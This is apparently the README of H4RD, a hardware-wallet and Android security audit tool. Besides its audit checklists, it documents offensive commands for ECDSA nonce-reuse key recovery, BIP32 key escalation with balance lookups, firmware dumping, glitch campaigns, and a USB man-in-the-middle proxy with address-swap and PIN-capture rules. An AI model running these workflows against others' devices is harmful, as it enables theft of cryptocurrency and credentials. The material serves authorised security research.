# H4RD
### Hardware Audit Research & Detection

```
  ██╗  ██╗ █████╗ ██████╗ ██████╗
  ██║  ██║██╔══██╗██╔══██╗██╔══██╗
  ███████║███████║██████╔╝██║  ██║
  ██╔══██║██╔══██║██╔══██╗██║  ██║
  ██║  ██║██║  ██║██║  ██║██████╔╝
  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝
  Hardware Audit Research & Detection  v4.0.0
```

Terminal-based hardware security audit tool. Plug in a device, run `h4rd scan`, get a scored vulnerability report with remediation guidance and exploit validation.

> **Legal**: For authorized security research and personal device auditing only. Do not run on devices you do not own. Exploit modules must only run on test/development devices.

---

## Install

```bash
git clone https://github.com/h4rd-tool/h4rd && cd h4rd
pip install -r requirements.txt && pip install -e .
pip install cryptography ecdsa   # recommended: full crypto verification
pip install reportlab             # optional: PDF report generation
pip install pysha3                # optional: faster Keccak-256 (Ethereum addresses)
```

**Linux udev rules:**
```bash
echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="2c97", MODE="0666"' | sudo tee /etc/udev/rules.d/99-ledger.rules
echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="534c", MODE="0666"
SUBSYSTEM=="usb", ATTR{idVendor}=="1209", MODE="0666"' | sudo tee /etc/udev/rules.d/99-trezor.rules
sudo udevadm control --reload-rules && sudo udevadm trigger
```

**macOS:** `brew install libusb hidapi`

---

## Usage

### Core Commands

```bash
h4rd scan                             # Full audit, auto-detect device
h4rd scan --quick                     # Skip fuzzing / side-channel / exploits
h4rd scan --device ledger             # Force device type
h4rd scan --output report.json        # Export JSON
h4rd scan --html report.html          # Export HTML
h4rd scan --pdf report.pdf            # Export PDF (requires reportlab)
h4rd scan --no-history                # Skip diff / don't save to history

h4rd list                             # List connected supported devices
h4rd modules                          # Show all available audit modules
h4rd info                             # Detailed device info
h4rd cve-update                       # Update CVE database
h4rd supply-chain                     # Supply chain check only
h4rd history                          # Show previous scan history
```

### Offensive Tools

```bash
h4rd chain                            # Automated exploit chain (scan -> recover -> derive)
h4rd extract                          # Wallet tree derivation from recovered key
h4rd key-audit                        # Key blast radius assessment from xpub
h4rd post-exploit                     # Impact report from chain results
h4rd craft-tx                         # Proof-of-concept TX crafting (never broadcasts)
h4rd firmware-dump                    # Extract firmware from hardware wallet MCU
h4rd firmware-analyze                 # Binary analysis of firmware image
h4rd glitch-gen                       # Generate ChipWhisperer glitch/power scripts
h4rd glitch-run                       # Run live glitch campaign on CW hardware
h4rd wireless                         # BLE/NFC wireless security audit
h4rd usb-attack                       # USB attack surface testing (HID, gadget, DuckyScript)
h4rd proxy                            # Real-time USB MitM APDU interception
h4rd osint                            # Blockchain OSINT from xpub or addresses
h4rd poc                              # Standalone PoC exploit generator
h4rd dpa                              # DPA/SPA power analysis campaign
```

---

## Offensive Arsenal

Detailed documentation of every offensive capability. Each tool operates independently or chains with others for full end-to-end attack workflows.

### Exploit Chain (`h4rd chain`)

Automated 8-phase exploit pipeline that chains signature collection, ECDSA nonce analysis, private key recovery, BIP32 parent key escalation, sibling key derivation, and multi-format address generation into a single zero-intervention run.

**What it actually does:** Collects N ECDSA signatures from the target device via APDU, runs nonce reuse / linear-k / MSB bias / lattice (LLL) analysis, recovers the child private key if a weakness is found, verifies it against the device public key, attempts BIP32 unhardened derivation to escalate from child to parent key using a supplied xpub, derives sibling keys at the same BIP32 level, then generates BTC (P2PKH, P2SH-P2WPKH, P2WPKH) and ETH addresses for every compromised key. Outputs a structured ChainResult with full step-by-step log.

```bash
h4rd chain                                        # Full automated chain, auto-detect device
h4rd chain --device ledger --samples 50           # Target Ledger, collect 50 signatures
h4rd chain --xpub xpub6... --siblings 30          # BIP32 escalation with xpub, derive 30 siblings
```

### Key Extraction (`h4rd extract`)

BIP32/BIP44 wallet tree derivation from a recovered private key or xpub, with optional live blockchain balance lookups via public read-only APIs.

**What it actually does:** Takes a raw private key (from chain or exploit output) and derives the full HD wallet tree across all standard BIP44/49/84 derivation paths (BTC legacy, BTC segwit, BTC native segwit, ETH, LTC). Generates 20 external + 10 change addresses per path. Optionally queries blockstream.info (BTC) and Cloudflare ETH RPC for balances, checks ERC-20 tokens (USDT, USDC), fetches USD prices from CoinGecko, and exports BIP380 wallet descriptors. xpub-only mode derives addresses without private keys using public child derivation.

```bash
h4rd extract --privkey 0xABCD...                  # Derive full wallet tree from recovered key
h4rd extract --privkey 0x... --check-balance      # Query blockchain for address balances + USD estimate
h4rd extract --xpub xpub6... --output report.csv  # Public-key-only derivation, export CSV
```

### Post-Exploitation (`h4rd post-exploit`, `h4rd craft-tx`)

Impact report generation and proof-of-concept transaction crafting for pentest deliverables.

**What it actually does:** `post-exploit` takes chain results and wallet profiles, generates an executive summary with CVSS scoring, remediation guidance, wallet descriptor exports (BIP380, Electrum, Wasabi format), and sanitized key material safe for report inclusion. `craft-tx` constructs valid-format BTC (raw P2PKH with DER-encoded ECDSA signatures) and ETH (EIP-155 RLP-encoded) transactions using DUMMY inputs (32 zero-byte TXID). These transactions are structurally valid but use fake inputs so they can never be broadcast. Self-verification confirms the signature is mathematically correct.

```bash
h4rd post-exploit --chain-result result.json      # Generate impact report from chain results
h4rd craft-tx --privkey 0x... --to ADDR --amount 0.01 --currency btc  # Craft PoC BTC TX (never broadcasts)
h4rd craft-tx --privkey 0x... --to 0x... --amount 0.1 --currency eth --chain-id 1
```

### Firmware Analysis (`h4rd firmware-dump`, `h4rd firmware-analyze`)

MCU firmware extraction via multiple vectors and binary analysis of obtained images.

**What it actually does:** `firmware-dump` attempts extraction through four vectors: BOLOS bootloader memory read commands (0xE0:0x06 with address/length), debug interface probes (JTAG/SWD over USB, ST-Link, OpenOCD), DMA/out-of-bounds read via crafted APDUs, and UART bootloader (STM32 system bootloader). Targets STM32 flash memory layout (0x08000000 base). `firmware-analyze` performs Shannon entropy mapping per block, ASCII/UTF-8 string extraction, crypto constant detection (AES S-box, SHA-256 round constants, secp256k1 curve parameters, BIP39 wordlist fragments), ARM Thumb-2 function prologue identification, compiler signature matching, and hardcoded key scanning.

```bash
h4rd firmware-dump --device ledger --output fw.bin           # Extract firmware via bootloader read
h4rd firmware-analyze --input fw.bin --output analysis.json  # Full binary analysis
h4rd firmware-dump --device trezor --vector uart             # Try UART bootloader extraction
```

### Glitch Research (`h4rd glitch-gen`, `h4rd glitch-run`)

Bridge between h4rd software profiling and ChipWhisperer hardware for physical fault injection and power analysis.

**What it actually does:** `glitch-gen` takes h4rd scan profiling data (timing windows, glitch detection results) and generates optimized ChipWhisperer scripts. Supports clock glitch (ext_offset sweep), voltage glitch (voltage + offset sweep), EM fault injection parameter generation, CPA (Correlation Power Analysis), and SPA scripts. Outputs standalone Python or Jupyter notebooks with device-specific parameters (Ledger ST33J2M0 at 48MHz, Trezor STM32F2/F4 at 120MHz). `glitch-run` executes a glitch campaign directly on connected ChipWhisperer Husky/Pro/Lite hardware, sweeping offset/width/repeat parameters up to a configurable max-attempts limit.

```bash
h4rd glitch-gen --device ledger --type clock                 # Clock glitch script for Ledger SE
h4rd glitch-gen --cpa --output cpa_script.py                 # CPA power analysis script
h4rd glitch-run --config glitch.json --max-attempts 10000    # Run live glitch campaign on CW hardware
```

### Wireless Audit (`h4rd wireless`)

BLE and NFC wireless security auditing for hardware wallets with wireless interfaces.

**What it actually does:** BLE scanning passively receives advertisements and identifies known wallet devices (Ledger Nano X service UUID 13d63400-2c97-..., CoolWallet, Keycard) by name and service UUIDs. BLE audit checks pairing security (Just Works vs MITM-protected), address type (public vs random), encryption status, and GATT characteristic permissions. BLE sniffing uses btmon/hcidump in monitor mode to capture traffic. NFC scanning sends SELECT commands with known wallet AIDs (Keycard A0000008040001, CoolWallet A000000804) and reads card metadata (UID, ATR, historical bytes). All operations are passive/read-only -- no packet injection or writes.

```bash
h4rd wireless --scan-ble --timeout 30                        # Scan for BLE wallet devices
h4rd wireless --audit-ble AA:BB:CC:DD:EE:FF                  # Audit BLE pairing security
h4rd wireless --scan-nfc                                     # Scan for NFC wallet tags
```

### USB Attack Surface (`h4rd usb-attack`)

Defensive USB attack surface testing -- probes whether a target device resists HID injection, descriptor spoofing, and USB-based attacks.

**What it actually does:** HID injection resistance testing verifies the device rejects arbitrary HID SET_REPORT commands (0x09) and detects HID descriptor spoofing on shared hubs. Generates watermarked (non-destructive) DuckyScript test payloads with H4RD_TEST watermark embedded. Produces Facedancer/USBProxy configuration files and APDU filter rules for transparent traffic interception. Generates Linux USB gadget configfs scripts (HID keyboard, mass-storage, composite, network). Attack simulation mode scores feasibility without executing any attack, including hardware requirements, time estimates, and countermeasures.

```bash
h4rd usb-attack test-hid 2c97:0001                          # Test HID injection resistance
h4rd usb-attack generate-gadget hid_keyboard                 # Generate Linux USB gadget script
h4rd usb-attack ducky exfil_test --output payload.txt        # Generate watermarked DuckyScript payload
```

### USB MitM Proxy (`h4rd proxy`)

Real-time APDU traffic interception between host software and hardware wallet over USB.

**What it actually does:** Sits between the host and device (via Facedancer, Linux USB gadget, or software proxy), logging every APDU in both directions with full decode (CLA, INS, P1, P2, data, SW). Supports injectable rules: AddressSwapRule replaces BTC/ETH output addresses in SignTx APDUs, AmountModifyRule changes transaction amounts, PINCapture logs PIN entry APDUs (VERIFY 0x00:0x20), ResponseTamperRule modifies device responses (fake attestation), and DelayRule adds artificial delay for timing attacks. Can replay captured sessions, export to PCAP format, and generate standalone Facedancer or Linux USB gadget proxy scripts. Demonstrates why verify-on-device is critical.

```bash
h4rd proxy --device ledger --live                            # Live APDU interception proxy
h4rd proxy --device ledger --rule pin_capture                # Capture PIN entries via MitM
h4rd proxy --generate-facedancer --output proxy.py           # Generate Facedancer MitM script
```

### Blockchain OSINT (`h4rd osint`)

Read-only blockchain intelligence for assessing the financial impact of compromised keys.

**What it actually does:** Derives BTC and ETH addresses from an xpub via BIP32/BIP44 public child derivation or accepts raw addresses directly. Queries public blockchain APIs (blockstream.info for BTC, Cloudflare ETH RPC) for balances and transaction history. Performs cluster analysis using the common-input-ownership heuristic to group related addresses. Tags known exchange deposit addresses (Binance, Coinbase, Kraken, Bitfinex, etc.) from an embedded mapping. Produces USD valuation via CoinGecko, and exports to CSV, JSON, or Chainalysis-compatible format. All operations are strictly read-only -- no transactions are ever created or broadcast.

```bash
h4rd osint --xpub xpub6... --full-analysis                  # Full OSINT: balances + TX + clustering
h4rd osint --address 1A2B...,0xABCD...                       # OSINT from specific addresses
h4rd osint --xpub xpub6... --chainalysis export.json         # Export Chainalysis-compatible JSON
```

### DPA/SPA Power Analysis (`h4rd dpa`)

Advanced side-channel power analysis campaign using USB timing as a proxy for power consumption.

**What it actually does:** Collects 1000+ timing samples at nanosecond precision (perf_counter_ns) across multiple APDU operations. Performs Welch's t-test distinguisher with Satterthwaite degrees of freedom to detect data-dependent timing. Runs template attack (Gaussian profiling + log-likelihood matching) against collected traces. Simulates cache-timing analysis using ARM Cortex-M 64-byte cache line model. Applies FFT filtering to remove USB polling noise (1kHz harmonics). Uses Kolmogorov-Smirnov two-sample test for distribution comparison and adaptive sampling until SNR threshold is met.

```bash
h4rd dpa --device ledger --samples 5000                    # Full DPA campaign (5000 traces)
h4rd dpa --device trezor --samples 1000 --output dpa.json  # Trezor DPA with JSON export
```

### PoC Generator (`h4rd poc`)

Automatic generation of standalone proof-of-concept exploit scripts from scan results.

**What it actually does:** For each vulnerability found during a scan, generates a self-contained Python script (no h4rd dependency) that reproduces the vulnerability. Supported types: ecdsa_nonce_reuse, bellcore_fault, debug_interface_open, bootloader_unsigned, pin_bypass_timing, ble_unencrypted, usb_descriptor_spoof, memory_leak. Each generated script includes a legal disclaimer banner, a --dry-run flag, hardware requirements, estimated time, and success probability. Scripts are made executable (chmod +x). Can generate individual PoCs or a full bundle from scan results.

```bash
h4rd poc --scan-result scan.json --generate-all              # Generate PoCs for all vulns in scan
h4rd poc --vuln-type ecdsa_nonce --output poc.py             # Generate single PoC script
h4rd poc --last-scan --output-dir ./pocs                     # Full PoC bundle from last scan
```

---

## Attack Chains

Example pentest workflows combining multiple tools into end-to-end attack sequences.

### Full Automated Pentest (Software-Only)

```bash
# 1. Scan device for vulnerabilities
h4rd scan --device ledger -o scan.json

# 2. Run automated exploit chain (sig collection -> nonce analysis -> key recovery -> address derivation)
h4rd chain --device ledger -o chain.json

# 3. Extract full wallet tree from recovered private key, check live balances
h4rd extract --privkey <recovered_key> --check-balance -o wallet.json

# 4. Blockchain OSINT on the compromised xpub -- clustering, exchange tagging, USD valuation
h4rd osint --xpub <xpub> --full-analysis -o impact.json

# 5. Generate impact report with CVSS scoring and remediation guidance
h4rd post-exploit --chain-result chain.json -o report.json

# 6. Generate standalone PoC scripts for every vulnerability found
h4rd poc --scan-result scan.json --output-dir ./pocs/
```

### Hardware Glitch Attack Pipeline

```bash
# 1. Profile the device timing windows with a scan
h4rd scan --device trezor -o profile.json

# 2. Generate optimized ChipWhisperer glitch script from profiling data
h4rd glitch-gen --profile profile.json --device trezor --type voltage -o glitch_campaign.py

# 3. Run the glitch campaign on connected ChipWhisperer hardware
h4rd glitch-run --config glitch_config.json --max-attempts 10000

# 4. If glitch succeeds, dump and analyze firmware
h4rd firmware-dump --device trezor --output fw.bin
h4rd firmware-analyze --input fw.bin --output fw_analysis.json
```

### USB MitM Interception

```bash
# 1. Generate Facedancer proxy script configured for the target device
h4rd proxy --generate-facedancer --device ledger --output proxy.py

# 2. Run live APDU interception (requires Facedancer or Pi Zero USB gadget)
h4rd proxy --device ledger --live --rule address_swap --attacker-addr 1A2B...

# 3. Export captured session to PCAP for Wireshark analysis
h4rd proxy --export-pcap session.json --output capture.pcap

# 4. Replay the captured session for reproducibility
h4rd proxy --replay session.json
```

### Wireless Recon + Audit

```bash
# 1. Scan for BLE hardware wallet advertisements
h4rd wireless --scan-ble --timeout 60

# 2. Audit BLE pairing security for a discovered device
h4rd wireless --audit-ble AA:BB:CC:DD:EE:FF

# 3. Sniff BLE traffic during a transaction
h4rd wireless --sniff-ble AA:BB:CC:DD:EE:FF --duration 120 --output ble_capture.json

# 4. Scan for NFC wallet tags
h4rd wireless --scan-nfc
```

---

## Hardware Requirements

What hardware is needed for each attack level.

### Level 1 -- Software Only

**Equipment:** USB cable

**Commands:** `scan`, `chain`, `extract`, `key-audit`, `osint`, `poc`, `post-exploit`, `craft-tx`, `exploit`

All software-based analysis runs over standard USB HID/WebUSB. Includes ECDSA nonce analysis, BIP32 key recovery, side-channel timing analysis, APDU fuzzing, blockchain OSINT, and PoC generation. No special hardware required beyond a USB connection to the target device.

### Level 2 -- BLE/NFC Wireless

**Equipment:** Bluetooth 4.0+ adapter (for BLE), ACR122U or similar NFC reader (for NFC)

**Commands:** `wireless`

BLE scanning requires a Bluetooth adapter supporting BLE (most built-in laptop adapters work). BLE sniffing requires btmon/hcidump and may need monitor mode support. NFC scanning requires a PC/SC-compatible NFC reader.

### Level 3 -- Hardware Attacks

**Equipment:** ChipWhisperer (Husky/Pro/Lite), Facedancer (GreatFET), Raspberry Pi Zero W, logic analyzer

**Commands:** `glitch-gen`, `glitch-run`, `firmware-dump`, `proxy`, `usb-attack`

| Tool | Hardware | Purpose |
|------|----------|---------|
| ChipWhisperer Husky/Pro | ~$250-$500 | Voltage/clock glitching, CPA/SPA power analysis |
| ChipWhisperer Lite | ~$50 | Basic glitching, educational use |
| Facedancer (GreatFET) | ~$100 | USB MitM proxy with full device emulation |
| Raspberry Pi Zero W | ~$15 | USB gadget mode for MitM proxy and HID injection |
| ST-Link V2 | ~$10 | JTAG/SWD debug probe for firmware extraction |
| Logic analyzer | ~$10-$50 | UART/SPI/I2C bus monitoring |
| ACR122U NFC reader | ~$30 | NFC tag scanning and APDU communication |

---

## Supported Devices

| Device | Module | Checks | Status |
|--------|--------|--------|--------|
| Ledger Nano S / X / S+ | `wallets.ledger` | 39 | Full |
| Trezor One / Model T | `wallets.trezor` | 43 | Full |
| Android (ADB) | `mobile.android` | 30 | Full |
| Generic USB | `usb.generic` | 14 | Full |

---

## Security Score

| Score | Band | Meaning |
|-------|------|---------|
| 90-100 | EXCELLENT | No significant issues |
| 70-89 | GOOD | Minor issues only |
| 50-69 | FAIR | Review recommended |
| 30-49 | POOR | Serious vulnerabilities |
| 0-29 | CRITICAL | Do not use this device |

Severity weights: `CRITICAL -25`, `HIGH -15`, `MEDIUM -8`, `LOW -3`
Category multipliers: attestation/critical x2.0, supply_chain/security x1.5, firmware/apps x1.2

---

## Ledger Audit -- 39 Checks

### Recon & Firmware (3)
| Check | Description |
|-------|-------------|
| USB Descriptor Analysis | Detect unexpected interfaces (CDC, DFU, HID anomalies) |
| Firmware Version & Target ID | Read SE version via APDU 0xE0:0x01, parse Target ID |
| CVE Database Lookup | Match firmware version against known CVE database |

### Supply Chain (3)
| Check | Description |
|-------|-------------|
| USB Identity Verification | Validate VID/PID against Ledger's official registry |
| Manufacturer String Audit | Check USB manufacturer/product strings for spoofing |
| Unofficial Firmware Detection | Hash/entropy analysis for non-official builds |

### Attestation (1)
| Check | Description |
|-------|-------------|
| Genuine Attestation (ECDSA) | 20-byte random nonce, verify ECDSA signature under device pubkey |

### Installed Apps (3)
| Check | Description |
|-------|-------------|
| App Enumeration & Hash Verification | Enumerate via 0xE0:0xDE, parse name/version/hash and verify against catalog |
| Suspicious App Detection | Detect debug/test/malicious app name patterns |
| Installed App Inventory | Full listing of installed apps with version and metadata |

### Security (3)
| Check | Description |
|-------|-------------|
| Debug Mode Detection | Probe 0xE0:0xFE -- must be rejected on production firmware |
| Bootloader Status | Detect DFU/bootloader mode exposure |
| PIN Brute-force Resistance | Read retry counter SW 0x63Cx, detect zero-retry state |

### Seed / Critical (6)
| Check | Description |
|-------|-------------|
| MCU Downgrade CVE-2018-12048 | Nano S SE < 1.4.2 vulnerable to MCU downgrade |
| Memory Isolation | SE memory isolation boundary verification |
| BIP32 Derivation | BIP32 chain code exposure + derivation path validation |
| TX Signing LSB-004 | Transaction signing integrity -- LSB-004 advisory |
| App Sideload Protection | Verify sideloaded app rejection on production firmware |
| SE Probe | Direct seed-read APDU probe on Secure Element |

### Side-Channel (2)
| Check | Description |
|-------|-------------|
| Timing Side-Channel Analysis | Multi-sample timing variance and statistical analysis |
| Clone Detection (Timing) | SE timing fingerprint -- genuine ST33 vs STM32/ESP32 clones |

### APDU Fuzzing (1)
| Check | Description |
|-------|-------------|
| APDU Interface Fuzzing | Boundary conditions, unknown INS sweep, malformed inputs |

### Glitch Detection (5)
| Check | Description |
|-------|-------------|
| Response Coherence | Same command x10 -- non-deterministic SW = anomaly |
| Rapid-Fire Stress | 20 commands without sleep -- race condition detection |
| State Machine Consistency | Out-of-order sequences, double genuine check |
| Timing Spike Detection | Responses > 5x baseline -- glitch recovery overhead |
| Replay Attack Resistance | Capture + replay nonce -- determinism profiling |

### App-Specific (2)
| Check | Description |
|-------|-------------|
| Bitcoin App Security Audit | Pubkey format, path confusion, malformed TX, segwit/legacy mixed |
| Ethereum App Security Audit | ChainId=0 replay, blind signing, EIP-712 domain spoofing, malformed RLP |

### Secure Channel / Crypto (5)
| Check | Description |
|-------|-------------|
| SCP Channel | Secure channel establishment and validation |
| Ephemeral Key Entropy | N sessions -- all ephemeral keys must be unique |
| Nonce Uniqueness | Device nonces across sessions must never repeat |
| RNG Quality | Random number generator output quality analysis |
| ECDSA Nonce Reuse | Detect k-reuse across signatures -- private key recovery |

### MCU vs SE Consistency (5)
| Check | Description |
|-------|-------------|
| Version Consistency | MCU/SE version pair must match official pairing table |
| Timing Fingerprint | GET_VERSION vs GENUINE_CHECK ratio must be >> 1 |
| SE Response Entropy | 5 genuine checks with different nonces -- all must differ |
| MCU Proxy Detection | Sub-3ms response = MCU answering without SE (supply chain attack) |
| Firmware Downgrade | CVE-based firmware downgrade surface analysis |

---

## Trezor Audit -- 43 Checks

### Recon & Firmware (4)
| Check | Description |
|-------|-------------|
| USB Descriptor Analysis | Detect unexpected interfaces, HID anomalies |
| Firmware Version & Model | Protobuf Initialize -> Features message parsing |
| CVE Database Lookup | Match version against Trezor CVE database |
| Bootloader CVE Lookup | Bootloader version independent CVE surface |

### Supply Chain (4)
| Check | Description |
|-------|-------------|
| USB Identity Verification | VID/PID: One=534C/0001, Model T=1209/53C1 |
| Clone Detection | Timing fingerprint vs genuine STM32F205 |
| Unofficial Firmware | Hash vs official Trezor releases + vendor key check |
| Supply Chain Full Audit | Comprehensive supply chain integrity verification |

### Security (5)
| Check | Description |
|-------|-------------|
| Debug Link Detection | DebugLinkGetState must be absent on production |
| PIN Protection | Features.pin_protection must be enabled |
| Passphrase (25th Word) | Passphrase support status and configuration |
| Backup Verification | Seed backup completion check |
| Wipe Code Protection | Wipe code configuration detection |

### Side-Channel Analysis (3)
| Check | Description |
|-------|-------------|
| PIN Timing Variance | Protobuf PIN verify timing across vectors |
| Differential Analysis | Welch t-test between PIN response groups |
| Bimodal Detection | Distribution gap analysis on timing samples |

### Protocol Fuzzing (5)
| Check | Description |
|-------|-------------|
| Protobuf Message Fuzzing | Malformed message IDs, truncated payloads |
| GetPublicKey Edge Cases | Invalid BIP32 paths, max depth, root key |
| SignTx Malformed | Invalid UTXO counts, overflow amounts, wrong coin |
| MessageSignature Abuse | Sign arbitrary messages, detect weak derivation |
| Unknown Message IDs | Sweep unknown types for undocumented handlers |

### Attestation (3)
| Check | Description |
|-------|-------------|
| Firmware Signature | Vendor keys in firmware header (4-of-5 multisig) |
| Bootloader Signature | Independent bootloader signature verification |
| Vendor Keys | Detect replacement of official Trezor vendor keys |

### App-Specific (3)
| Check | Description |
|-------|-------------|
| Bitcoin Signing | SIGHASH manipulation, fee siphoning, mixed segwit |
| Ethereum Signing | ChainId replay, blind signing, EIP-712 |
| Multi-coin Path | Coin type confusion across derivation paths |

### Persistence (2)
| Check | Description |
|-------|-------------|
| State After Reset | Wipe + reinitialize -> clean state verification |
| Session Leakage | Sessions properly terminated between operations |

### Glitch Detection (5)
| Check | Description |
|-------|-------------|
| Response Coherence | Same command x10 -- non-deterministic response = anomaly |
| Rapid-Fire Stress | 20 commands without sleep -- race condition detection |
| State Machine Consistency | Out-of-order protobuf sequences, double init |
| Timing Spike Detection | Responses > 5x baseline -- glitch recovery overhead |
| Replay Attack Resistance | Capture + replay nonce -- determinism profiling |

### MCU Consistency (4)
| Check | Description |
|-------|-------------|
| Version Consistency | MCU/firmware version pair must match official pairing table |
| Timing Fingerprint | Initialize vs GetFeatures ratio -- detect MCU proxy |
| Response Entropy | Multiple feature queries with varying state -- all must differ appropriately |
| MCU Proxy Detection | Sub-3ms response = MCU answering without secure processor |

### Exploit Modules (5)
| Module | Description |
|--------|-------------|
| ECDSA Nonce Reuse | k-reuse across Trezor signatures -> private key |
| BIP32 Key Recovery | xpub + signed message -> private key |
| Debug Link Oracle | If debug link active -> extract PIN/seed directly |
| Protobuf Injection | Malicious protobuf bypassing state machine |
| Seed Phrase Extraction | Sequence designed to leak seed material |

---

## Android Audit -- 30 Checks

> **v4.0.0 improvements:** Dynamic CVE lookup against live database, real per-app permission audit with risk scoring, system app signature verification, improved cleartext traffic detection via logcat/manifest analysis, TEE/StrongBox keystore checks, and USB debug authorization auditing.

### Device Info (3)
| Check | Description |
|-------|-------------|
| ADB Connection & Device Info | Model, build, Android version, security patch |
| Android Version & CVE Status | Dynamic CVE lookup for detected Android version |
| Security Patch Age | Flag patches > 90 days |

### Root & Integrity (5)
| Check | Description |
|-------|-------------|
| Root Detection | su, Magisk, SuperSU, KingRoot, Xposed |
| Magisk Detection | Magisk paths, properties, installed modules |
| SELinux Status | Must be Enforcing on production devices |
| Verified Boot Status | ro.boot.verifiedbootstate: green/yellow/orange/red |
| System Partition Integrity | /system partition hash spot-check |

### Network Security (5)
| Check | Description |
|-------|-------------|
| ADB TCP Exposure | adb over TCP port 5555 -- critical if externally reachable |
| Listening Ports Audit | netstat -tlnp -- unexpected services |
| Firewall Status | iptables rules audit |
| VPN Configuration | Detect VPN-based traffic interception |
| DNS Configuration | Check DNS-over-HTTPS status |

### App Security (5)
| Check | Description |
|-------|-------------|
| Suspicious Package Detection | Cross-reference against known malware signatures |
| Dangerous Permissions Audit | Real per-app permission enumeration with risk scoring |
| Accessibility Services | Detect active overlay/keylogger services |
| Unknown Sources Policy | INSTALL_UNKNOWN_APPS per-package check |
| System App Signature Integrity | Verify system apps not re-signed (signature verification) |

### Certificates & Crypto (4)
| Check | Description |
|-------|-------------|
| User CA Certificates | Detect user-installed root CAs (MitM vector) |
| Network Security Config | No trust-anchors for user certs |
| Cleartext Traffic Detection | Improved cleartext HTTP detection via logcat and manifest analysis |
| Certificate Pinning Bypass | Frida/Objection artifact detection |

### Encryption & Lock (3)
| Check | Description |
|-------|-------------|
| Full Disk / File-Based Encryption | ro.crypto.state + FBE status (Android 10+) |
| Screen Lock Strength | Lock type classification and password quality audit |
| Keystore Security | TEE/StrongBox hardware keystore verification |

### Developer & Debug (3)
| Check | Description |
|-------|-------------|
| Developer Options Status | Must be disabled on production devices |
| USB Debug Authorization Audit | ADB exposure, TCP debug, and authorization state audit |
| Mock Location Detection | Detect mock location providers |

### Exploit Modules (2)
| Module | Description |
|--------|-------------|
| Exploit -- ADB Shell Escalation | ADB active -> enumerate sensitive data |
| Exploit -- Wallet App Data Extraction | Pull sandbox data for installed crypto wallets |

---

## Universal USB Audit -- 14 Checks

### Descriptor Analysis (4)
| Check | Description |
|-------|-------------|
| USB Class/Subclass | Classify device, flag unexpected class codes |
| String Descriptors | Manufacturer, product, serial -- detect spoofing |
| Configuration Count | Multiple configurations may indicate hidden mode |
| Interface Endpoints | Map all endpoints, flag non-standard combinations |

### Protocol Fuzzing (4)
| Check | Description |
|-------|-------------|
| Control Request Fuzzing | Sweep vendor-specific bRequest 0x00-0xFF |
| Malformed Descriptors | Request oversized descriptor data |
| Interface Claim Test | Attempt to claim all interfaces |
| Alternate Setting Sweep | Probe all alternate settings per interface |

### BadUSB Detection (3)
| Check | Description |
|-------|-------------|
| HID + Mass Storage | Dual-class = potential BadUSB |
| Descriptor Mismatch | Claimed class != actual behavior fingerprint |
| HID Report Descriptor Analysis | Parse HID report descriptors for keystroke injection patterns |

### Power & Physical (2)
| Check | Description |
|-------|-------------|
| USB Power Draw | Excessive current = possible hardware implant |
| USB Speed Negotiation | Speed downgrade attack detection |

### Timing Analysis (1)
| Check | Description |
|-------|-------------|
| USB Response Timing Analysis | Statistical timing analysis to detect anomalous response patterns |

---

## Exploit Engines -- Technical Reference

### ECDSA Nonce Analysis (`h4rd chain`)
Collect N signatures from the target device. Detect k-reuse, linearly-related nonces, MSB bias, or lattice-reducible patterns.
- **k-reuse recovery:** `privkey = (s1*z2 - s2*z1) / (s1 - s2) mod n`
- **Partial nonce:** Pure Python LLL lattice reduction (Gram-Schmidt + Lovász condition)
- **Format support:** DER (Ledger), protobuf (Trezor), raw (r,s), auto-detect
- **Protections checked:** Low-s normalization (BIP 62), signature malleability

### Bellcore Fault Attack (`h4rd chain`)
Two ECDSA signatures on the same message — if one is faulty (induced via voltage/clock/EM glitch):
- **Algebraic recovery:** Same-r and different-r cases with full solver
- **Bit-flip enumeration:** Brute-force across 256 bit positions with EC point verification
- **Active injection:** Timed USB reset, race conditions, power cycling during signing

### DPA/SPA Power Analysis (`h4rd dpa`)
Timing-based proxy for power analysis over standard USB.
- **1000+ traces** at nanosecond precision (perf_counter_ns)
- **Welch's t-test** with Satterthwaite degrees of freedom
- **Template attack:** Gaussian profiling + log-likelihood matching
- **Cache-timing simulation:** ARM Cortex-M 64-byte cache line model
- **FFT filtering** to remove 1kHz USB polling noise
- **Adaptive sampling** until SNR threshold is reached

### USB Glitch Profiling (`h4rd glitch-gen`, `h4rd glitch-run`)
USB reset injection at precisely timed intervals during critical operations.
- **11 phases:** Baseline, glitch window mapping, SOF alignment, reset injection, recovery profiling, race conditions, EM fault simulation, bus contention, CW parameters, persistence, session comparison
- **ChipWhisperer integration:** Generates optimized scripts for Husky/Pro/Lite

### BIP32 Key Recovery (`h4rd chain --xpub`)
xpub (public key + chain code) + child private key from any exploit above
-> BIP32 unhardened derivation -> parent private key -> all sibling keys.
Full wallet compromise from a single child key leak.

---

## Architecture

```
h4rd/
├── cli/main.py                          # Typer CLI entry point (all commands)
├── core/
│   ├── engine.py                        # Orchestrator + scoring + history + PDF
│   ├── scoring.py                       # Score 0-100 + PDF/HTML + diff
│   ├── device_detector.py               # USB VID/PID auto-detection
│   ├── module_registry.py               # Module discovery
│   ├── cve_db.py                        # CVE database + auto-update
│   ├── attestation.py                   # Ed25519 + CA chain
│   ├── app_checker.py                   # App enumeration + hash verification
│   ├── sidechannel.py                   # Statistical timing analysis
│   ├── apdu_coverage.py                 # Exhaustive APDU fuzzing
│   ├── glitch_detector.py               # Fault injection detection
│   ├── mcu_se_checker.py                # MCU vs SE consistency
│   ├── app_auditor.py                   # Bitcoin + Ethereum app audit
│   ├── secure_channel.py                # ECIES verification
│   ├── supply_chain.py                  # Clone + supply chain detection
│   └── exploit/
│       ├── __init__.py
│       ├── ecdsa_nonce.py               # ECDSA nonce reuse + private key recovery
│       ├── bip32_recovery.py            # BIP32 xpub + signed msg -> privkey
│       ├── dpa_trace.py                 # DPA/SPA timing correlation
│       ├── usb_glitch.py                # USB reset timing profiling
│       ├── bellcore.py                  # Bellcore fault attack
│       ├── chain_orchestrator.py        # 8-phase automated exploit chain
│       ├── live_extraction.py           # BIP32/44 wallet tree + balance check
│       ├── key_audit.py                 # Key blast radius assessment
│       ├── post_exploit.py              # Impact report + PoC TX crafting
│       ├── firmware_dump.py             # MCU firmware extraction (BOLOS/JTAG/UART)
│       ├── chipwhisperer_bridge.py      # ChipWhisperer glitch/CPA/SPA scripts
│       ├── wireless_audit.py            # BLE/NFC security audit
